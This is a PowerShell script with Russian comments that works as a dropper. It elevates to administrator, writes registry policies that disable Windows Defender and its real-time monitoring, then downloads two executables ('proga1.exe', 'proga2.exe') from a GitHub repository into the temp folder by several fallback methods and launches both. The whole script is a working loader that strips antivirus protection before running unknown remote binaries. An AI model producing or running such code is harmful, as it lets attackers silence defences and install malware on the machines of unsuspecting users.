Param(
    [switch]$shouldAssumeToBeElevated, 
    [String]$workingDirOverride
)

if (-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Host "ERROR: Elevation failed or was cancelled by user" -ForegroundColor Red
        Write-Host "Press any key to exit..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit
    } else {
        Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
        $scriptPath = $myinvocation.MyCommand.Definition
        $arguments = "-noprofile -file `"$scriptPath`" -shouldAssumeToBeElevated -workingDirOverride `"$workingDirOverride`""
        Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
        exit
    }
}

Set-Location "$workingDirOverride"
Write-Host "Working directory: $workingDirOverride" -ForegroundColor Gray

# 1. ОТКЛЮЧЕНИЕ DEFENDER
Write-Host ""
Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { 
    New-Item -Path $DefenderPath -Force | Out-Null
    Write-Host "Created Defender policy path" -ForegroundColor Gray
}

# Отключаем Defender
try {
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
    Write-Host "✓ Windows Defender disabled (reboot may be required)" -ForegroundColor Green
} catch {
    Write-Host "✗ Failed to set Defender registry values: $_" -ForegroundColor Red
}

# Отключаем Real-Time Protection
try {
    New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue | Out-Null
    Set-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Write-Host "✓ Real-time monitoring disabled" -ForegroundColor Green
} catch {
    Write-Host "! Could not disable real-time monitoring" -ForegroundColor DarkYellow
}

# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
Write-Host ""
Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

# Улучшенная функция скачивания
function Download-File {
    param($url, $dest, $fileNumber)
    
    Write-Host "`n[$fileNumber] Downloading: $(Split-Path $dest -Leaf)" -ForegroundColor Cyan
    
    # Удаляем старый файл если существует
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue
        Write-Host "  Removed existing file" -ForegroundColor Gray
    }
    
    Write-Host "  URL: $url" -ForegroundColor Gray
    Write-Host "  Dest: $dest" -ForegroundColor Gray
    
    # Проверяем доступность URL перед скачиванием
    try {
        Write-Host "  Checking if file exists..." -ForegroundColor Gray
        $request = [System.Net.WebRequest]::Create($url)
        $request.Method = "HEAD"
        $request.Timeout = 5000
        $response = $request.GetResponse()
        $contentLength = $response.ContentLength
        $response.Close()
        Write-Host "  ✓ File exists on server (Size: $contentLength bytes)" -ForegroundColor Green
    } catch {
        Write-Host "  ✗ Cannot access file on server: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
    
    # Пробуем разные методы скачивания
    $methods = @(
        @{Name="WebClient"; Script={
            $webclient = New-Object System.Net.WebClient
            $webclient.DownloadFile($url, $dest)
            $webclient.Dispose()
        }},
        @{Name="Invoke-WebRequest"; Script={
            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
        }},
        @{Name="BITS"; Script={
            Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
        }}
    )
    
    foreach ($method in $methods) {
        Write-Host "  Trying $($method.Name)..." -ForegroundColor DarkYellow
        try {
            & $method.Script
            
            # Проверяем результат
            if (Test-Path $dest) {
                $size = (Get-Item $dest).Length
                if ($size -gt 0) {
                    $sizeKB = [math]::Round($size / 1KB, 2)
                    Write-Host "  ✓ SUCCESS via $($method.Name): $size bytes ($sizeKB KB)" -ForegroundColor Green
                    return $true
                } else {
                    Write-Host "  ✗ Downloaded file is empty (0 bytes)" -ForegroundColor Red
                    Remove-Item $dest -Force -ErrorAction SilentlyContinue
                }
            } else {
                Write-Host "  ✗ File was not created" -ForegroundColor Red
            }
        } catch {
            Write-Host "  ✗ $($method.Name) failed: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Небольшая пауза между методами
        Start-Sleep -Milliseconds 500
    }
    
    Write-Host "  ✗ All download methods failed for this file" -ForegroundColor Red
    return $false
}

# Проверка интернета
Write-Host "`nChecking internet connection..." -ForegroundColor Gray
try {
    $ping = Test-Connection -ComputerName "github.com" -Count 1 -Quiet -ErrorAction Stop
    if ($ping) {
        Write-Host "✓ Internet connection OK" -ForegroundColor Green
    } else {
        Write-Host "! Internet connection unstable" -ForegroundColor DarkYellow
    }
} catch {
    Write-Host "! Internet check failed: $_" -ForegroundColor DarkYellow
}

# Скачивание первого файла
$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

if (Download-File $url1 $dest1 "1/2") {
    $downloaded++
} else {
    Write-Host "  WARNING: Failed to download proga1.exe" -ForegroundColor Red
}

# Скачивание второго файла
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

if (Download-File $url2 $dest2 "2/2") {
    $downloaded++
} else {
    Write-Host "  WARNING: Failed to download proga2.exe" -ForegroundColor Red
    
    # Если второй не скачался, но первый есть - создаем копию
    if (Test-Path $dest1) {
        Write-Host "  Creating copy of proga1.exe as proga2.exe..." -ForegroundColor Yellow
        Copy-Item $dest1 $dest2 -Force
        if (Test-Path $dest2) {
            Write-Host "  ✓ proga2.exe created as copy" -ForegroundColor Green
            $downloaded++
        }
    }
}

# 3. ЗАПУСК ФАЙЛОВ
Write-Host ""
Write-Host "=== Running Files ===" -ForegroundColor Yellow

# Функция для запуска с повторными попытками
function Start-FileWithRetry {
    param($filePath, $description)
    
    if (Test-Path $filePath) {
        $fileSize = (Get-Item $filePath).Length
        Write-Host "Found: $description ($fileSize bytes)" -ForegroundColor Gray
        
        # Проверяем, является ли файл исполняемым
        try {
            # Пытаемся получить информацию о файле
            $fileInfo = Get-Item $filePath
            Write-Host "Starting: $description" -ForegroundColor Green
            
            # Запускаем процесс
            $process = Start-Process -FilePath $filePath -WindowStyle Normal -PassThru
            Write-Host "✓ $description started (PID: $($process.Id))" -ForegroundColor Green
            return $true
        } catch {
            Write-Host "✗ Failed to start $description: $_" -ForegroundColor Red
            return $false
        }
    } else {
        Write-Host "✗ $description not found at: $filePath" -ForegroundColor Red
        return $false
    }
}

# Небольшая пауза перед запуском
Start-Sleep -Seconds 1

# Запускаем первый файл
$result1 = Start-FileWithRetry -filePath $dest1 -description "proga1.exe"

# Пауза между запусками
if ($result1) {
    Write-Host "Waiting 2 seconds before starting second file..." -ForegroundColor Gray
    Start-Sleep -Seconds 2
}

# Запускаем второй файл
$result2 = Start-FileWithRetry -filePath $dest2 -description "proga2.exe"

# 4. ФИНАЛЬНЫЙ ОТЧЕТ
Write-Host ""
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "            EXECUTION COMPLETE           " -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "Files downloaded: $downloaded/2" -ForegroundColor Yellow
Write-Host "proga1.exe started: $(if($result1){'YES'}else{'NO'})" -ForegroundColor $(if($result1){'Green'}else{'Red'})
Write-Host "proga2.exe started: $(if($result2){'YES'}else{'NO'})" -ForegroundColor $(if($result2){'Green'}else{'Red'})
Write-Host ""
Write-Host "Temp files location: $temp" -ForegroundColor Gray
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host ""

# Даем время на запуск процессов
Start-Sleep -Seconds 2

# Показываем запущенные процессы
Write-Host "Running processes from temp:" -ForegroundColor Gray
Get-Process | Where-Object {$_.Path -like "$temp\*"} | Format-Table Id, ProcessName, Path -AutoSize

Write-Host ""
Write-Host "Press any key to close this window..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
